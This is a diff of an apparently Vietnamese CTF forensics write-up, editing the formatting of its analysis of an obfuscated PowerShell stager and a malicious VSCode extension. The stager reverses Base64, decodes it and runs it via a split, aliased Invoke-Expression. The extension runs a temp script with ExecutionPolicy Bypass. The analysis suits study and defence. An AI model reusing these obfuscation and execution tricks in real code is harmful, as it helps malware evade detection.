@@ -98,24 +98,24 @@ $9ozWfHXdm8eIBYru = "InV"+"okE"+"-ex"+"prE"+"SsI"+"ON" ; new-aliaS -Name PwN -Va
 ```
 
 Đoạn mã trên là một đoạn mã PowerShell được làm rối (obfuscation)
-
-> Chuỗi Base64 bị đảo ngược
-> - $wy7qIGPnm36HpvjrL2TMUaRbz = "..." ;
-> - $9U5RgiwHSYtbsoLuD3Vf6 = $wy7qIGPnm36HpvjrL2TMUaRbz.ToCharArray() ;
-> - [array]::Reverse($9U5RgiwHSYtbsoLuD3Vf6) ;
+>
+Chuỗi Base64 bị đảo ngược
+- $wy7qIGPnm36HpvjrL2TMUaRbz = "..." ;
+- $9U5RgiwHSYtbsoLuD3Vf6 = $wy7qIGPnm36HpvjrL2TMUaRbz.ToCharArray() ;
+- [array]::Reverse($9U5RgiwHSYtbsoLuD3Vf6) ;
 Một chuỗi Base64 đã bị đảo ngược từng ký tự.
+>
+Giải mã Base64
+- $FHG7xpKlVqaDNgu1c2Utw = [systeM.tEXT.ENCODIng]::uTf8.geTStRInG([sYsTeM.CoNVeRt]::FROMBase64StRIng("$9U5RgiwHSYtbsoLuD3Vf6")) ;
+- Sau khi đảo ngược, chuỗi này được decode từ Base64 về dạng chuỗi UTF-8, có thể chứa mã lệnh thực thi.
 
-> Giải mã Base64
-> - $FHG7xpKlVqaDNgu1c2Utw = [systeM.tEXT.ENCODIng]::uTf8.geTStRInG([sYsTeM.CoNVeRt]::FROMBase64StRIng("$9U5RgiwHSYtbsoLuD3Vf6")) ;
-> - Sau khi đảo ngược, chuỗi này được decode từ Base64 về dạng chuỗi UTF-8, có thể chứa mã lệnh thực thi.
-
-> Thực thi chuỗi đã giải mã
-> - $9ozWfHXdm8eIBYru = "InV"+"okE"+"-ex"+"prE"+"SsI"+"ON" ;
-> - new-aliaS -Name PwN -ValUe $9ozWfHXdm8eIBYru -fOrce ;
-> - pwn $FHG7xpKlVqaDNgu1c2Utw ;
-> - - "Invoke-Expression" bị tách thành nhiều phần để tránh bị phát hiện.
-> - - Tạo một alias "PwN" trỏ đến Invoke-Expression (iex).
-> - - Thực thi nội dung đã giải mã, có thể là mã độc hoặc lệnh từ máy chủ tấn công
+Thực thi chuỗi đã giải mã
+- $9ozWfHXdm8eIBYru = "InV"+"okE"+"-ex"+"prE"+"SsI"+"ON" ;
+- new-aliaS -Name PwN -ValUe $9ozWfHXdm8eIBYru -fOrce ;
+- pwn $FHG7xpKlVqaDNgu1c2Utw ;
+- - "Invoke-Expression" bị tách thành nhiều phần để tránh bị phát hiện.
+- Tạo một alias "PwN" trỏ đến Invoke-Expression (iex).
+- - Thực thi nội dung đã giải mã, có thể là mã độc hoặc lệnh từ máy chủ tấn công
 
 Khá dài dòng, nhưng trc hết cứ reverse lại base64 rồi giải mã đã
 
@@ -231,7 +231,7 @@ Ban đầu không mở được
 
 ![image](https://github.com/user-attachments/assets/270abe64-1f92-4c1e-b376-fdfdf81f8368)
 
-Liền vào xem mã hex thử
+Mở bằng HxD xem có gì bất thường không
 
 ![image](https://github.com/user-attachments/assets/ef5dbc2f-7cae-46d1-b7eb-89d5a61756b0)
 
@@ -253,8 +253,8 @@ Ngồi mò thêm các thư mục khác xem có gì không thì phát hiện tạ
 
 File trên là một extension cho Visual Studio Code (VSCode) được viết bằng JavaScript (TypeScript chuyển đổi sang JavaScript) và sử dụng Node.js APIs
 
-> Mục đích chính là kích hoạt lệnh rs để chạy 1 đoạn powershell tạm thời (temp0001) trong thư mục C:\Users\vboxuser\AppData\Local\Temp\
-> Chạy tập tin PowerShell này với quyền Bypass ExecutionPolicy
+- Mục đích chính là kích hoạt lệnh rs để chạy 1 đoạn powershell tạm thời (temp0001) trong thư mục C:\Users\vboxuser\AppData\Local\Temp\
+- Chạy tập tin PowerShell này với quyền Bypass ExecutionPolicy
 
 Hmm cũng không quan tâm lắm nhưng thấy có 1 dòng chữ khá giống base64 ở gần cuối 
 
@@ -306,7 +306,7 @@ Và 1 file âm thanh, mở ra nghe thấy có các tiếng bíp ngắn và dài 
 
 ![image](https://github.com/user-attachments/assets/2adc0e4f-143a-40bd-9df1-f67d136b7306)
 
-Đối với file .jpg thì dùng steghide với pass là vừa decode file âm thanh "SNOOOOOOPPPPPPP"
+Đối với file .jpg thì dùng steghide với pass vừa decode file âm thanh "SNOOOOOOPPPPPPP"
 
 ![image](https://github.com/user-attachments/assets/6e5d6bfd-d784-4835-be89-3fcdc1dfcc06)
 
